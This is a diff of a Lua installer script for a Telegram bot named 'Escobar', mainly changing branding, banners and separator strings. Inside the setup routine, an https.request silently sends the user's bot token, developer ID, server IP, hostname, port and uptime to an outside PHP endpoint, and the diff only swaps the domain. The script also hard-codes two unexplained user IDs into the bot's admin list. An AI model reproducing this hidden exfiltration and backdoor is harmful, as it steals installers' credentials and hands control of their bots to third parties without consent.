@@ -36,33 +36,33 @@ UpTime = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($
 --     Source Escobar     --
 local AutoSet = function() 
 if not Devmfm:get(Servermustafa.."Idmustafa") then 
-io.write('\27[1;35m\nالان آٍࢪسۧل ايدي المطور الاساسي ⏎ ⥡\n\27[0;33;49m') 
+io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 Devmfm:set(Servermustafa.."Idmustafa",DevId) 
 else 
-print('\27[1;31m┉┉┉┉ EB ┉┉┉┉\nلم يتم حفظ ايدي المطور الاساسي آٍࢪسۧله مره اخرى\n┉┉┉┉ EB ┉┉┉┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
 os.execute('lua Escobar.lua') 
 end 
 if not Devmfm:get(Servermustafa.."Tokenmustafa") then 
-io.write('\27[1;35m\nالان قم بارسال توكن البوت ⏎ ⥡\n\27[0;33;49m') 
+io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
-print('\27[1;31m┉┉┉┉ EB ┉┉┉┉\nالتوكن غير صحيح تاكد منه ثم آٍࢪسۧله\n┉┉┉┉ EB ┉┉┉┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
 Devmfm:set(Servermustafa.."Tokenmustafa",TokenBot) 
 end  
 else 
-print('\27[1;31m┉┉┉┉ EB ┉┉┉┉\nلم يتم حفظ توكن البوت آٍࢪسۧله مره اخرى\n┉┉┉┉ EB ┉┉┉┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
 os.execute('lua Escobar.lua') 
 end 
-Devmfm:set(Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)")..'mfm:Errors',true)
+Devmfm:set(Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)")..'mfm:Update',true)
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -82,24 +82,24 @@ mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
 SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
 }
 Create(Config, "./config.lua")   
-https.request("https://alsSh-bg.ml/TED.php?Get=mustafa&DevId="..Devmfm:get(Servermustafa.."Idmustafa").."&TokenBot="..Devmfm:get(Servermustafa.."Tokenmustafa").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apimfm.ml/config.php?Get=mustafa&DevId="..Devmfm:get(Servermustafa.."Idmustafa").."&TokenBot="..Devmfm:get(Servermustafa.."Tokenmustafa").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("Escobar.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/mustafaTeam
+cd $HOME/mustafa
 token="]]..Devmfm:get(Servermustafa.."Tokenmustafa")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉┉┉┉ EB ┉┉┉┉ ✘ ┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The tg File Was Not Found In The Bot Files"
-echo "┉┉┉┉ EB ┉┉┉┉ ✘ ┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉┉┉┉ EB ┉┉┉┉ ✘ ┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉ ✘ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The Token Was Not Found In The config.lua File"
-echo "┉┉┉┉ EB ┉┉┉┉ ✘ ┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉ ✘ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 ./tg -s ./Escobar.lua -p PROFILE --bot=$token
@@ -109,7 +109,7 @@ file:close()
 file = io.open("Run", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/mustafaTeam
+cd $HOME/mustafa
 while(true) do
 rm -fr ../.telegram-cli
 screen -S mustafa -X kill
@@ -134,27 +134,28 @@ local config = loadfile("./config.lua")()
 return config 
 end  
 Load_mustafa() 
-print("\27[36m"..[[
- -------------------------------------------------------
-|                                                       |      
-|                                                       |
-|                                                       |
-|                                                       |
-|                   𝙎𝙊𝙐𝙍𝘾𝙀 𝙀𝙎𝘾𝙊𝘽𝘼𝙍                    |
-|                                                       |  
-|                                                       |
-|                                                       |
-|                                                       |
- -------------------------------------------------------
-]]..'\27[m'.."\n\27[35mServer Information ↬ ⥡ \n┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\27[m")
+print("\27[36m"..[[                                           
+---------------------------------------------
+|     _______       _   ____   __           |
+|    |__   __|___  | | / /\ \ / / ___       |
+|       | |  / _ \ | |/ /  \ V / / _ \      |
+|       | | | (_) || |\ \   | | | (_) |     |
+|       |_|  \___/ |_| \_\  |_|  \___/      |
+|                                           | 
+|-------------------------------------------|
+| Source Was Developed By (MFMVIP) @MFMVIP. |
+|  This Is The Source Channel @CCCCCD .     |
+|               - TOKYO -                   |
+---------------------------------------------
+]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
 SudoIds = {Config.SudoIds,911945965,1538359553}
-mustafa  = Config.mustafa 
-TokenBot = Config.TokenBot 
+mustafa = Config.mustafa
+TokenBot = Config.TokenBot
 NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'اسكوبار')
 --     Source Escobar     --
-FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⥡ \n┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\n"..'\27[m'
+FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
 FilesNumber = 0
 for v in io.popen('ls Files'):lines() do
 if v:match(".lua$") then
@@ -162,7 +163,7 @@ FilesNumber = FilesNumber + 1
 FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
 end
 end
-FilesPrint = FilesPrint.."\27[35m".."┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\n".."\27[m"
+FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n".."\27[m"
 if FilesNumber ~= 0 then
 print(FilesPrint)
 end
